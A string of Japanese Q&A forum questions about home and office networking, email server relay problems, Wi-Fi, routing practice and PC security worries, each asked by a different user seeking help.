http://oshiete.goo.ne.jp/qa/8012080.html http://okwave.jp/qa/q8024660.html http://okwave.jp/qa/q8024731.html 以前の質問でも相談したように、今年の３月上旬から固定電話に対する非通知設定の着信で悩まされていて、個人情報の漏洩の可能性を考えたので、３月の下旬からプロバイダや電話会社といった多くのサポートを受けて、アドバイスされた通り回線を再起動したのですが、これを機に不穏な動きがいくつか発生し、普段は気にならない些細な行動でも「何かあるのか？まさか犯人なのか？」と深く考えてしまい、疑心暗鬼に陥っていました。単なる偶然が重なってしまっただけなのか？或いは、回線を再起動した事に対して、犯人側が自分が犯人だと私にバレてしまったと勘違いして焦ってしまったのか？犯人側の必然的な宣戦布告の意志の表れなのか？ただ、私は犯人が判明していないので困っていたのですが、その事実を犯人は知らないのかもしれません。犯人は見知らぬ他人の可能性（私の電話番号は、以前に使っていた人がいて、いろんなところに既に登録されていて、色んな業者の類が私の番号が記載されているリストを入手されているといった可能性）も考えたのですが、もしそうだった場合は説明がつかない矛盾や疑問が大量に発生してしまうので、その可能性は少ないと思っております。「心当たりはないのですか？」と訊かれて、疑わしい人物は３人いましたが、決定的ではなかったので「ない」とは答えました。あとは出来れば疑いたくないというのもありましたので…。ただ、心の葛藤において「疑いたくない」といった甘さが自分自身を苦しめているのかもしれません。少なくとも、私はまだ完全に疑惑を捨て切れた訳ではなく、不可解な現象が回線再起動後を機に起こり始めたのがずっと引っ掛かっていて、ここ一週間くらいは考え過ぎなのかもしれないと気にしないようにしていたのですが、冷静に考えてみたら「いや、やっぱり何かある」と疑いを再び持ち始めたので、不可解な現象に対する疑問を真剣に考察しようと思います。 ここからが質問です。 プロパイダに提案された回線を再起動する意味を再度問い合わせたら、情報漏洩の原因の一つとして考えられるIPアドレスというのを変更する為だと言われたのですが、IPアドレスを変更した事が第三者に発覚するという事が有り得るのでしょうか？ そもそも、私が公開した事がない自分のIPアドレスを第三者が入手する事が有り得るのでしょうか？ もし、そうであるならば、一体どういう方法で入手したというのでしょうか？更にそのIPアドレスから固定電話の番号を入手する事が可能なのでしょうか？プロバイダは「そのような事は考えにくい。」と言われたのですが…。しかし、私的には私情において、どうしても附に落ちない点がいくつかあるので…。
よろしくお願いします。 この度、ルーターからHUBなるものをはじめて接続して利用したいと考えています。 使用予定のHUB機器はこちらです。 http://buffalo.jp/products/catalog/network/lsw3- … そこで、質問です。 この機器は5ポートと書いてあるのですが、これは使用できる機器分のポート数が5つということでしょうか？ ただ、5つしか入力端子が無く、元から入力するLANはどこに挿すのでしょうか？ もし、この5つの1番とかが入力側であれば、そこから分岐されて使用できる数は4ポートとなるかと思います。（１つ入力で使うので） そもそもHUB自体を理解できていない可能性もあるのですが。（汗 私の行いたいことを再度纏めさせて頂きます。 ルーターからの出力LANをHUBに入力。 ↓ HUBから5つのLANに出力。（分岐？） ↓ 出力LAN端子をそれぞれ5台のPCに接続して、5台利用できる環境を構築。 というのが目標です。 これを実現するには、私のHUBを利用するという認識はあっていますでしょうか？ また、その際掲示させて頂いたHUBの機器で、5台を利用することは可能なのでしょうか？ 上記にあげた機器を検索で調べてみるのですが、入力もとの端子が別にある気配も無いので、5ポートとあったが、実は入力で1ポート使われて、実際は4ポートなのでは…。という部分が気になりました。 というか、そもそも利用する機器はHUBでよいのでしょうか？TT どなたか、HUBまたはネットワークにお詳しい方、アドバイス頂けますと助かります。 よろしくお願いいたします。
現在ESXi5.0（無償版)で仮想端末9台を動かしています。これをAグループとBグループの２つに分けて Aグループ　192.168.1.1 Bグループ　192.168.2.1 Cグループ　192.168.3.1 といったようにそれぞれのグループ同士はつながらないようにして各グループで外に出れるよう仮想L3スイッチを導入したいのですが、ソフトウェアL3スイッチはどうすれば入手できますか？ 有償無償にかかわらず教えていただけたら幸いです。 PS.もしかしたらESXi5.0の機能についているのでしょうか？ 現在は無償版を使用していますが、近日中にvSphereを導入する予定です。
ネットワークのことを勉強しております。 その中でメールについてまだまだ無知で、色々調べているのですが わからないことが多く、こちらにご質問できればと思います。 ・ISP?からメールドメインを取得すると、自動的に世界中の人が参照できるDNSサーバーにMXレコードの情報が登録されるのでしょうか。 また、社内環境に外部用DNSサーバー（セカンダリ？）をおく場合もあるようですが、その場合のメリットというのはどのようなものでしょうか。（メールサーバー以外の用途もあるのかもしれませんが・・・。） ・セキュリティ向上のために、MTAサーバーが一度メールを受信することが多いかと思いますが、 　FireWall等でNAPTでメールを受信、それを社内のメールで受ける場合、セキュリティとして 　前者と違いは生じますでしょうか。 ・リバースプロキシサーバーをDMZにおく場合ですが、リバースプロキシサーバーは基本的に SSLーVPN(httpsからのアクセスを受ける）と同じと認識してよろしいでしょうか。またMTAとの機能を持たすこともできるのでしょうか。 ご存知の方いらっしゃいましたら、アドバイスいただけますでしょうか。 宜しくお願い致します。
シンプルBOX2.5 USB2.0+eSATA（CSS25EU2BK）を使用してTOSIBA　MQ01ABD100を外付けHDDとしてesataで接続していますが、認識しません。 ちなみにUSB接続は正常に認識します。 また　ｇｒｏｏｖｙ　UD-500SA　でも動作確認済みです。 二台のPCでテストしましたが症状は発生しました。 自作デスクトップ マザーボード　880GMS-E41 sateからリアフロントにesataに延長し、そこから接続。 ノートパソコン DELL STUDI 1557 標準装備のesataに接続。 それぞれBIOSは最新。 esataは有効状態。 PC起動前に外付けHDD起動 電力供給は付属USBケーブル、自前の5VACアダプター、付属USBケーブル経由でのUSBコンセントの三通りを使用。 また初期不良の疑いを考え、購入した量販店での交換も実施済み。 何か考えられる原因がありましたらご教授ください。
会社から、業務上外部転送の許可を得たPDFを私の個人メールに送付したところ、そのPDFに脆弱性があったとセキュリティの主幹部署報告がありました。 そのPDFはそのセキュリティ主管部署が作成したものですが、一般的にこの「脆弱性」とは、どのようなものなのでしょうか。 Adobe Readerに脆弱性があって云々というのは理解できるのですけど…。
フリーソフトをダウンロードしたら、ブラウザを開くたびに、ページのすみに「PCスピードテストとか、「○○ソフトのダウンロード」とかの、ポップアップが出てくるんですが、これを消す方法はありませんか？ いろいろ調べたのですが、PC素人な為よくわからないです。 詳しく説明よろしくお願いします(・・;)
Catalyst4507E siriesのsupervisor交換をしようとしているのですが、活線挿抜で実施してネットワーク断等通信に影響したりしないものでしょうか。 IOSバージョンは同じです。
先日から会社の都合でSSHというものを使わされております。 とても初歩的な質問かと思い恐縮なのですが、サーバー上にあるデータをSSHから直接自分のPCのデスクトップにダウンロードすることは可能でしょうか？ 色々と調べてみたのですが、何となくそれっぽいコマンドはあるよう？なのですが、実際の使用方法が分かりませんでした。 使用しているPCはWindows7です。 場所は、C:\Users\○○\Desktop　にダウンロードしたいと仮定した場合、実際にはどのようなコマンド・オプションの指定を行えば良いでしょうか？ 非常に基本的なことかも知れませんが、分かりかねます。 どなたかアドバイスを頂けますと助かります。 よろしくお願いいたします。
ＮＴＴの光プレミアム（マンションタイプ）から光ネクストへ変更したのですが、ＮＴＴのネットセキュリティーが使用できないとの事でマカフィーネットセキュリティーをダウンロードして使用しているのですが、 重くてしかたありません。 何か良いネットセキュリティー又は、市販セキュリティーソフトのお勧めを教えてください。 よろしくお願いします。 パソコン仕様は以下の通りです。 ＯＳ：WindowsXP　　MediaCenterEdition　Ver2002 　　　ServisPack3 ＣＰＵ：Celeron　3.06ＧＨz ＲＡＭ：504MB 空き容量：Ｃ（90GB）D（6.51GB）
こんばんは。 最近私のPCに突然異変が起きたので質問させてください。 一週間ぐらい前から、何故かインターネットエクスプローラが、おかしいのです。 例えば、ブログからツイッターを開けると、戻るボタンを押しても戻らなくて、数回押すと戻るという現象。戻るボタンの矢印を右クリックして戻ることにしたのですが、なぜか、ブログとツイッターのあいだには開いてもいないURLがあるのです。 もうひとつの症状は、フェイスブックなど、個人情報系を開くと、いちいち、セキュリティーがなんとかと、したの方に表示されます。 とか、またもやしたの方に、ブロックしました、許可しますか？とかなど表示が出るようになりました。 システムなものは触っていません。 あえていうなら、スカイプウイルスをミスでDLしかけたことがありました。 もし、私のPCがウイルス系に感染していたら、と思うと恐ろしいです。 何もしてないのに動作が遅くなることもシバシバですから・・・ ウイルスソフトは、お金がない、そして重くなる原因などでインストールしていません。 ただたんなる、エラーでしょうか？
初めまして、村田　諒也と申します。 別セグメント間の通信に関して質問なのです。 私がしたいことは、ネットワークアドレスの異なるＰＣに対してPing到達させたいです。 詳しく記載致します。 環境↓↓↓↓ PC1 PC2 IP:192.168.1.10 IP:192.168.10.2 SM:255.255.255.0 SM:255.255.255.0 　　ルータ 　　　　　　　　　　ＩＰ1：192.168.1.100　　　　ＩＰ：192.168.10.1 ＰＣ1－－－f0/0ルータｆ0/1－－－PC2と言う配線で ＰＣ1からルータ（ｆ0/0）は通信ＯＫ ＰＣ1からルータ（（ｆ0/1)は通信ＮＧ ＰＣ1からＰＣ2への通信ＮＧは理解できますが、これらの環境で ＰＣ1からルータ（ｆ0/0）は通信 ＰＣ1からルータ（（ｆ0/1)は通 ＰＣ1からＰＣ2への通信 をＯＫにするにはどのようにすれば良いのか教えて頂けますでしょうか？
centOS上でsendmailを使っているのですが、googleにメールが送信できなくなったのでログを見たところ、以下のようなログが大量に残っておりました。 A）送信失敗のログ（googleのブラックリスト入り？） Apr 12 16:36:48 ****** sendmail[30748]: r3C5Auuw004157: to=<******@gmail.com>, ctladdr=<mail@******.com> (8/12), delay=02:25:52, xdelay=00:00:02, mailer=esmtp, pri=572773, relay=alt4.gmail-smtp-in.l.google.com. [173.194.73.26], dsn=4.0.0, stat=Deferred: 421-4.7.0 [***.***.***.***] Our system has detected an unusual amount of B）googleからのリレー？ Apr 12 18:17:13 ****** sendmail[8443]: r36Hgv7Y028734: to=<******@gmail.com>, delay=5+15:34:15, xdelay=00:01:59, mailer=esmtp, pri=2469474, relay=gmail-smtp-in.l.google.com. [74.125.129.26], dsn=5.1.1, stat=User unknown 多分Bのせいでgoogleに規制されたではないかと思っているのですが、 relay=gmail-smtp-in.l.google.com というのがどうにも解せません。 これってgmailのサーバがこちらのメールサーバにアクセスしてメールを送信しようとしている意味ですよね？ しかもUser unknownで失敗しています。 これはいったいどういう意味なのでしょうか？ そもそもログの意味を勘違いしているのでしょうか？ アドバイス頂けると助かります。 よろしくお願い致します。
先日「三者中継テスト通ってるのに踏み台？」 http://oshiete.goo.ne.jp/qa/8028585.html の質問をした者です。 前回は送信に失敗していると思っていたのですが、googleのブラックリストに載ってしまったので再度確認していたところ、 Apr 12 16:10:39 ****** sendmail[24738]: r3BK94Pj003810: to=<tony@sikespaper.com>, delay=00:50:37, xdelay=00:00:01, mailer=esmtp, pri=190766, relay=sikespaper.com.1.0001.arsmtp.com. [204.232.236.144], dsn=2.0.0, stat=Sent (1929114351 message accepted for delivery) のように送信に成功しているケースがありました。 再度三者中継テストをしても問題ないので /etc/mail/access　に sikespaper.com.1.0001.arsmtp.comREJECT tony@sikespaper.comREJECT 204.232.236.144REJECT のように書いたのですが、それでも上記のようなstat=Sentのログが残ってしまいます。 FEATURE(`access_db', `hash -T<TMPF> -o /etc/mail/access.db')dnl は有効になっており、 makemap -v hash /etc/mail/access.db < /etc/mail/access /sbin/service sendmail restart も行なっております。 次の手が見つからず、暗中模索状態になってしまいました。 アドバイス頂けると助かります。 どうぞよろしくお願い致します。
元々、ある特定のゲームアプリ利用でWi-Fiが再三切断していました。 他のアプリでは問題なく接続ができていました。 問題のゲームアプリを中断後、都度、手動接続（「設定」>「Wi-Fi」>Wi-Fi を一度無効にしてから、 もう一度有効)していましたが、何故かそのアプリを起動させると、すぐに3Ｇ回線に 切り替わっていました。特定のそのアプリだけだったので、特に問題視してませんでした。 ところが昨日、とうとう、3Ｇ回線からWi-Fiに再接続ができなくなりました。 起動させているすべてのアプリを終了させても、iPhone本体を再起動させても、接続ができません。 加えて下記のことを試しましたが、すべてダメでした。 　・『一般』>『設定』>『Wi-Fi』>『このネットワーク設定を解除』>ルータの認識はあり 　・『DHCPリースを更新』>IPアドレスとサブネットマスクが表示されるだけ 　・『一般』>『リセット』>『ネットワーク設定をリセット』>本体再起動 　・モデム、Wi-Fi ルータの電源を切った後に、もう一度電源を入れて再起動 IPアドレス　169.254.174.95 サブネットマスク　255.255.0.0 ルータ、ＤＮＳ欄がなぜか空欄 ルータはNEC WARPSTAR8300Nを使用 あと、ＰＣ、家族所有のiPhone5からWi-Fi ネットワークに接続を確認していますが、 いずれもインターネットにアクセスできます。 なぜ復旧できないのでしょうか。 ご教授ください、よろしくお願いします。
ネットワークセキュリティについて勉強しています。 ロードバランサーでSSLアクセラレータを使用して、SSL通信をする場合の 動作に関して教えていただきたく、よろいくお願いします。 （インターネット）----[ロードバランサ]-----------[WEBサーバ] 　　　　　　　　　【https⇒http】 上記の様に、SSLアクセラレータ機能を持つロードバランサと WEBサーバで構成されている場合、ロードバランサ上で httpsからhttpに変換されるという理解なのですが、 この場合、インターネットから来る全てのhttpsでの接続はロードバランサ上で 復号処理がされるのでしょうか？（質問(1)） また、この場合、WEBサーバ上でSSLのサービス（OpenSSL等）が 起動されていても、復号処理はロードバランサで行われるため、 WEBサーバ上のSSLのサービスは使用されないのでしょうか？（質問(2)） ロードバランサで復号されるということは、ロードバランサと WEBサーバの間の通信はhttp(port:80)で行われるのでしょうか？（質問(3)） 理解不足な点が多く、分かりにくい質問かもしれませんが、 詳しい方ご教授頂けるとありがたいです。 よろしくお願いします。
ネットワーク管理者もどきですが、教えて頂きたいことがあります。 近年、WiFiルータを個人でも持っている人が多くなっており、社員の中には、社内ネットワークに接続して、WiFiアクセスポイントとして安くネットワーク費用を抑えようとする者が出てきかねません。 不正なIPアドレスやMacアドレスの端末がネットワークに繋がっていないかを感知、あるいは、接続を防止する方法は無いでしょうか？ 使いうる全てのアドレスにpingを飛ばして、その結果をテキストファイルに吐き出し、全社のIPアドレス割り当て表とマッチングすれば、検出は出来る可能性はありますが、特定が難しいのと、リアルタイムで監視する訳でもないので防止は難しいと思います。 ネットワーク構成はスター型のＷＡＮで200台程の本社にファイヤウォールを設置しています。 例えば、ファイヤウォール上にホワイトリストで接続許可のアドレスを羅列するとか、スループットを分散するために、別にＤＨＣＰサーバーを立てて、固定ＭＡＣアドレスのホワイトリストを羅列するとか、ということになるのでしょうか？
数十名規模の小さい会社に勤めています。 一部サーバを外部に公開することを検討しており、 それに伴い、FW機器の購入を検討しています。 FWとして「CheckPoint製のセキュリティアプライアンスUTM-1」と 「NetScreen/SSG」を検討していますが、 実績や操作性、サポートなどを考慮してどちらがお勧めでしょうか？。 参考に皆様のご意見やご経験を教えて頂けますと幸いです。
cisco社の、WAP4410PというWiFiルーターを使用していこうとしています。 有線でそのルータにネットをつないで、そこから各デバイスに無線で飛ばすのですが、暗号キーの設定がないので、cicsoというアクセスポイントをクリックしただけで、ネットがつながる状態です。 誰でも繋がる状態、また、第三者が情報を得られるといったポップアップも出てきてしまいます。 cisco社に問い合わせると、契約時の保守番号が必要と言われたのですが、紛失してしまい、cisco社から設定の仕方を聞けない状態で、こちらに書き込みをしています。 私のパソコンは、Windows7 lenovoのThinkPad X121eを使っています。 （⇒不要な情報かもですが、念のため、載せておきます。） 誰でもネットに繋がるのではなく、暗号キーもしくはセキュリティーコード（と、言うのでしょうか）、設定の仕方をお分かりになる方、教えていただけますと、幸いです＞＜； 宜しくお願い致します<m(__)m>
社内にある、共有のフォルダ（外付けHDD内）を 外から、別の支社からつないで見れるようにしたいんですが、 以前も、似たような質問をして クラウドを設けた方がいいと言われたんですが、 速度的なことや、ファイルの競合しあったりで 不便なところを感じてる次第で・・・。 友人から、ネットを光に変えたらできるようなことを 言われたんですが・・・。 回線を光にしなくてもいい気はしますが、 IPアドレスを固定にして 設定するだけではもちろんだめですよね？ あたかも、外からでも社内にいるような感じで 共有フォルダを設定できないでしょうか？ すみません、こんがらがってきたので 教えてください。
大田区粗大ゴミを申込みしようと思ってるのですが 町名選び丁目をプルダウンで選ぼうとしても選べません。。。 xpのＰＣでは大丈夫なのですが8のＰＣからだと表示されません。 何かセキュリティがかかっているのか良くわかりません。 どうすればプルダウン選べるのか教えてください。 （セキュリティどこを解除すればいいのか・・・）
フレッツ光ネクスト隼に代えました。 設定はNTT西日本のサービスを利用しました。 工事・設定が終わってしばらく使っていたのですが、セキュリティが最新でないとのエラーが出始めました。 NTT西日本に問い合わせたところ、使用しているルーターがIP6に対応してないとの事でした。 ルーターを交換したのですが、今度はネットワークにつながらなくなってしまいました。 現状ですが フレッツ光のモデム→ルーター（WHR-G301：バッファロー) →(1)パソコンA(WIN 7) →(2)パソコンB(WIN XP) →(3)ネットワークプリンター →(4)ハブ と4つケーブルささっていて (4)ハブから →(5)パソコンC(WIN XP) →(6)パソコンD(WIN XP) →(7)NAS(HDL-C：アイ・オー・データ) と分岐して繋がっています。 後はノートパソコンとIPADがあるのですが、有線でネットワークの接続ができない状況なので 無線の設定ができていない状況です。 現状ですが、パソコンB・C・Dでは TCP/IPのIPアドレスを設定しています。 これらのパソコンからはNASにつながるのですが、インターネットには繋がりません。 パソコンAはローカルエリアの接続からネットワークを接続の状況を表示すると IPv4とIPv6がインターネットに接続されていて、NASにはつながりません。 IPv4のプロパティから TCP/IPをIPの自動取得をやめて TCP/IPをIPアドレスを設定すると NASにアクセスできるようになりましたが、インターネットにつながらなくなりました。 IPv4 接続 インターネット IPv6 接続 ネットワークアクセスなし との表示になりました。 ルーターを交換する前は、セキュリティが更新されないだけで、どのパソコンから もNASにアクセスできてインターネットにもつながっている状況でした。 ネットで調べながらいろいろしてみたのですが、 正直なところ、わけがわからなくなっています。 ご助言お願いします。
原因が分からないのですが、つい先日からInternetExplorer9でのみ、上部に表示される広告がおかしくなっていることに気付きました。 広告表示のあるページだけなのですが、一瞬だけ見知った企業の広告が表示された後、すぐに下のような広告に切り替わります。 おかしいと思って、色々調べ、Spybotでスキャンしてみたり 入れた覚えのないおかしなアプリケーションが入っていないか調べたりとしたのですが全く改善されません。 また、いつもはIEではなくOperaを使用しているのですが、そちらではこういった現象は起きていません。 放っておいてもいいものなのかどうかもわからず困っています。 解決策をご存知の方、教えていただけませんでしょうか。 ちなみに、Windows7 64bitで、セキュリティソフトはNortonを使用しています。
いろいろ教えていただいて、安全な通信について調べはじめました。 S/MIMEは安全なのかと思って調べていたら、次のようなものを見つけました。 S/MIME は、メールの送受信者におけるエンドツーエンドのセキュリティを 提供するものであるが、送受信者が利用可能なPKI 環境の存在が活用の前提と なる。送信者はS/MIME を利用するために、信頼できる電子認証局から発行さ れた電子証明書を、事前に所有している必要がある。S/MIME の信頼性は証明 書を発行した認証局の信頼性に依存しており、不特定多数との信頼性の高いメ ール送受信を行ないたい場合に向いている。 認証局の信頼性はどのようにして調べたらよいのでしょうか？ 認証局の信頼度の格付け、AAA,Aaa,BBBとかはどこかで調べられるのでしょうか？ この信頼性は、実際に通信しているときにどこかに表示されるのでしょうか？ 調べ始めたばかりで、へんな質問かもしれませんが、よろしくお願いします。
centOS上でsendmailを使っている者です。 http://www.rbl.jp/svcheck.php で第三者中継テストを行い、結果が >全てのテストが行われました, no relays accepted. で安心していたのですが、数日前から急に踏み台にされるようになりました。 ログを見ると全て「stat=Deferred」で「stat=Sent」となっているものは１つもないので 送信は失敗しているようなのですが、キューはたまるしログでHDDが圧迫されるので何とかしたいと思っています。 何かよい方法がありましたら、ご教示頂きたく思います。 よろしくお願い致します。
サーバーのパスワードは、暗号化されて記憶されているので、そのパスワードのファイルを盗んでもキーがないと見れないのではないのですか？　何かツールで見れるのですか？ この事件では、ＬＯＧＩＮされた形跡があるとのことですが、実際はどうなんですか？
初心者なりに調べたところ、詳細は次のような状態です。どうぞよろしくお願い致します。 【前提】別のパソコン(XPとVista)で正常動作を確認しているLANケーブルがある。 【問題】新しいパソコン(7)をつなぐとネットワークにつながらない。 ただし、この新しいパソコン(OS Windows7)は別ネットワークにはつながることを確認しており、 また、本問題確認後も再度別ネットワークにもっていき接続できることを確認している。 【詳細】 (1)つなぐことのできるPCでは OS XPまたはVista IPアドレス192.168.●.X/24 DHCP 192.168.●.1 GW 10.系 (2)つなげないPCでは OS 7 ipconfigの結果は disconnected windowsのGUIでもアイコン「ローカルエリア接続」が表示されない 【他の方法】DHCPに原因があるのか絞り込むため、 　　　　　　手動でIPアドレスを設定しようとすると・・・ (1)つなぐことのできるPCでは IPアドレスのネットワーク部とGWのネットワーク部が異なるため、 手動設定を保存することができない。 (2)つなげないPCでは OS 7 windowsのGUIでもアイコン「ローカルエリア接続」が表示されない ため、手動設定を試すことすらできない。 【質問】 a.どうしたら新PC(OS 7)をこのLANケーブルにつないでインターネットに接続することができるか b.詳細の(1)もGWが別ネットワークでなぜつながっているのでしょうか？ c.問題のPCの「ローカルエリア接続」が表示されないの(またはdisconnected)はなぜでしょうか？
プロバイダ－が変わりました。ヤフ－からエンジョイネットに変わりました。 なんとか設定を行いネットつながる様に出来ました。またメ－ルの送受信の設定も出来たように思っております。ＯＵＴＬＯＯＫの送受信が遅くなった様に感じます。 その上に「ネットワ－クパスワ－ドの入力」サ－バ－・ユ－ザ－名（Ｕ）・パスワ－ド（Ｐ）の３項目が要求されます。 ネットで調べ色々試しましたが消えてくれず、ＯＵＴＬＯＯＫ開いている間、消しても何度も出てきます。 サ－バ－に(ｐｏｐ.・・・Enｊｏｙ.ne.jp) ユ－ザ－名に（アドレス）　パスワ－ドに（新パスワ－ド）を入力し、ＯＫをクリックしてもパソコンが納得してくれません(>_<)　 専門的な事は全く分からない素人です。「ネットワ－クパスワ－ドの入力」が出なくなる手段、こんな私でも分かる説明、お願いします！
お世話になります。 社内で無線LANを使用したいのですが、半径30メートルくらい強力なものはないでしょうか？ また、社内ネットワークには入れたくないです。 可能であれば、SNMPが使えるとありがたいです。
学校でネットワークの仕組みを勉強したのですが、インターネットは PC（LAN)→ルーター→ルーター→ルーター・・・ になっているとのこと。 要するに「次のルーターへどんどんデータを送っている状態がネットワーク」と言うことみたいですが、ここで一つ疑問です。 ルーターの設定をやらせてもらったのですが、（ciscoのルーターです）デフォルトルートやネクストホップを決めて次のルーターや次の次のルーターにデータを送っているようなのですが、家のパソコンの場合、そんな設定をした覚えがありません。（そもそもパソコンが1台なのでルーターがありません） これは家のネットワークはISPまでの大きなLAN（WAN？）と思って良いのでしょうか？ パソコンと最初につながっているルーターがISP側にあるってことでしょうか？？ いまひとつピンときません。 どんな風にネットワークがつながっていて、どんな技術を使っているのか教えていただけませんでしょうか。 解説が載っているページを紹介していただいても結構です。 よろしくお願いします。
ご教授願います。 メールフォーム設定を　送信者に対して　ありがとうメール、または　確認メールを送る　という設定にしている状態でのことです。 ある時にスパムに攻撃され大量にデタラメなメールアドレスから迷惑メールが送信されました。 この時、迷惑メール送信者にも　設定どおり　送信者に対して　ありがとうメール、または　確認メールが 送られるはずです。 しかし、でたらめなメールアドレスがゆえに送信不能、MAILER-DAEMONがサーバーから送られてくる とは思うのですが、この時　MAILER-DAEMON　は送られてきませんでした。 なぜ、このような状況が起こるのでしょうか？ もともと　サーバー側の設定で　MAILER-DAEMON　が送信されない仕掛けなのか、 どこかで　MAILER-DAEMONが消滅したのか、どんな状況が考えられるのでしょうか？ よろしくお願いいたします。
http://www.ntts.co.jp/products/ccraftmail/functi … 上記のURLでのパスワードの送り方について、 このパスワードは、 楕円曲線暗号やRSA暗号のような公開鍵暗号で守られているのでしょうか？ もしそうでないならば、 パスワード送信に公開鍵暗号を使わない理由がなにかあるのでしょうか？ 受信者に楕円曲線暗号やRSA暗号の公開鍵、秘密鍵を作れるソフトを無料で配布すれば 受信者の作成した公開鍵でパスワードを暗号化して送れます。そうすれば、 受信するときにも安心してパスワードを受信できると考えます。 楕円曲線暗号などを使わない理由が分かりません。 その理由がお分かりの方よろしくお願いいたします。
ポケットwifi(L-03E)を使ってPS3に繋げたいのですがmzk-mr150というLANを使ってやろうとしたのですがインターネットのランプが付きませんでした これは故障でしょうか？またL-03Eを使ってLANをするならいいLANありませんか?
Wiresharkで初めてパケットを調べてみました。 見方もあまりわからないのですが、とりあえずIPアドレスを見てみたり、そのIPアドレスからホスト名を調べてみることにしました。 すると「WimaxUser39188-113.wateen.net」というなんとなく怪しげなホスト名が現れたのですが、ただWimaxを使ってるユーザーなのかな程度しかわかりません。 何か他に情報は得られますか？
昨日、無料出会い系サイトに登録してしまいました。 どこかをクリックしたわけではなく、自らの意思でです。 架空のニックネーム・住所(県と町まで)・ヤフーのメールアドレス・年齢を入力しました。 その後、詐欺？メールらしきものがたくさんきました。 登録後発覚したのですが、退会させないようにしたりと評判がよろしくないようで、被害もあるみたいです・・・。 サイトには退会方法は詳しく書いていません。 またログインボタンもありません。 サイトの担当者らしき人のメールアドレスに退会処理のメールを送りました。 一応、退会の確認メールを頂くように書いておいたのですが、一刻も早くメールアドレスを削除したほうがいいのかと思い、ヤフーのIDを消しました。なので確認メールは来ません。 詐欺？メールも当然こなくなり、住所も簡単なもののみで、本名や電話番号は入力していないので、 これからも心配する必要はありませんよね？ メールは開いていないし、ポイントなども一切触れていません。 何もなかったことにして大丈夫ですか？ お答えいただけると助かります。 カテゴリ間違っていたらすいません(^^;)
こんにちは。 今回、引越しの際にしてauひかり　ギガ得プランを申し込みました。。が サーバーが使えなくなってしまいました。 起動環境はWindows７　UltimateEditon　+　Apache serverです。 プロバイダは　So-netさんです まず問題はBL900HWというホームゲートウェイからポートマッピング機能がうまくはたらかないということです。 Test1 IP4V　IP6Vのマッピング、DMZ、2重ルータなどなど、考えられる設定はすべて試してみる →うまくいかない、ただ、Pingを送信してみたところ、80番ポートは開いてはいる模様 Serverの設定の方に問題があるのかと考え、 Test2 テストで自前のルータのMACアドレスをBL900HWのMACアドレスを書き換えて、 Modem→My Router→Server のように設定したところ、ポートマッピングも、DMZも、VirtualHostもすべて正常に作動しました。 そもそもポート開放ができないのかと思い サービスセンタに問い合わせたところ、 A：そんなことはありません （。。。） ここで疑問に思うことは次の二つです。 １．なぜ！簡単であるはずのポートマッピングが使えないのか？本当は　プロバイダから制限をかけているのではないのか？ ２．Modem→BL900HW→Serverにした時と、Modem→My Router→Serverにした時のグロバルIPが違います。 グロバルIPはモデムが承って、ルータの方に送るはずなので、ルータが変わったところでグロバルIPは変化しないはずなのですが、両方のSettingではルータがまったく違うグロバル割り当てられます。 宜しくお願いします。
ネットワークを今勉強している初心者です。 PATの勉強をしているのですが、PATをするとルーターを超えてPINGが通らなくなりますよね。 例：routerでPATの設定をしているとLAN1からLAN2へはping通りませんよね LAN1----router----(internet)---router---LAN2 できたらLAN1からLAN2の特定のPCにだけpingを通したいと考えています。 （具体的にいうとLAN2にDNSサーバーを構築して、それをLAN1で使いたいのです） どのような設定をしたらよいのでしょうか。 ヒント的なページがあればそれだけでも教えていただければ嬉しいです。 ちなみにこれは勉強のために構築したネットワークですが、実務でもこのような使い方はすることはありますでしょうか？ 本社のDNSを支社で使うみたいな・・ 実務であまり使うイメージがわかないので・・ よろしくお願いします。
ネットワーク勉強中の初心者です。 今回static routeの勉強をしているのですが、pingがうまく通らないので、どのように設定すればよいか教えてください。 構成は以下のようになっています。 ルーター3台 ルーター１ ルーター２ ルーター３ ルーター１ f0にはL2スイッチが接続（スイッチにはPC-BとPC-Cが接続）　network:192.168.10.0/24 e0にはPC-Aが接続 network:192.168.20.0/24 e1にはルーター2が接続 network:50.0.0.0/8 ルーター2 e0にはルーター１が接続 network:50.0.0.0/8 e1にはルーター3が接続 network:60.0.0.0/8 ルーター3 e0にはルーター2が接続 network:60.0.0.0/8 e1にはL2スイッチが接続（スイッチにはPC-DとPC-Eが接続） network:192.168.30.0/24 IPアドレスの設定はすべて終わっています。（スイッチに接続された各PCの設定も終わっています） static routeの設定は以下のようにしています。 ルーター1で60.0.0.0/8と192.168.30.0/24 ルーター2で192.168.10.0/24と192.168.20.0/24と192.168.10.0/24192.168.30.0/24 ルーター3で192.168.10.0/24と192.168.20.0/24と50.0.0.0/8 設定完了後にpingをすると、 PC-A→PC-D、PC-E　成功 PC-A→PC-B、PC-C　失敗 PC-B→PC-C　成功 ルーター１→PC-B、PC-C　成功 ルーター１→PC-A　成功 PC-A→PC-B、PC-Cのみ失敗します。 これはstatic routeの設定がされていないため？？ PC-A→PC-B、PC-Cへはルーターを超えるので、やはりstatic routeが必要なのでしょうか。 だとしたら、どこに設定をするのでしょうか？（パソコン？？ルーター？？それともこの場合はstatic routeではなく、ripなどでdynamic routeの設定が必須？？） 勉強中でよくわかっていない初心者の質問なので、あきれるような質問かもしれませんが、よろしくお願いします。
ipadからのリモート接続についてご教授お願いします。 環境および状況は下記のようになっております。 【環境】 ipadから別の場所にあるWindows2003serveのリモートを行う。 回線はフレッツ光プレミアムでCTUにはルータ（YAMAHA RT58i）およびWebcasterの２つがブリッジにて接続し、事情がありネットワークは分けている（それぞれに別のISP情報が入ってます） VPN接続はルータ（YAMAHA RT58i)よりネットボランチを取得しそのIDとパスワードで接続。 リモートするWindows2003はこのルータ（YAMAHA RT58i)の配下にあり。 Windows2003のリモートデスクトップの設定は終了しており、ポートも開放。 （リモートデスクトップ用のアカウントも作成設定済です） ipad側のVPNの設定も終了しており、iTap RDPにてWidows機をリモートする。 ipadはWiFiモデルでWillcomのHX009ZTというモバイルルーターで外部から接続。 【状況】 VPNは接続できており、問題ないように見えます。 iTapRDPを起動し、リモート用のアカウントで接続しようとすると、 ログイン画面がかすかに見えるところでフリーズし、ログインできません。 しかしモバイルルーターをドコモのXiに変更してテストしてみると、 上記環境の2003でも問題なくリモートすることができました。 最初はWillcomのモバイルルータが原因かと思いましたが、 Willcomでも回線がネクスト＋Win2008の場合はスムーズに接続でき、 また回線がBフレッツにつながった２００３でもOKでした。 上記の状況から判断するとフレッツ光プレミアムの回線のみWillcomからリモート出来ないように、 見えますが、少しでも解決の手がかりをご存知の方がありましたらご教授お願いします。 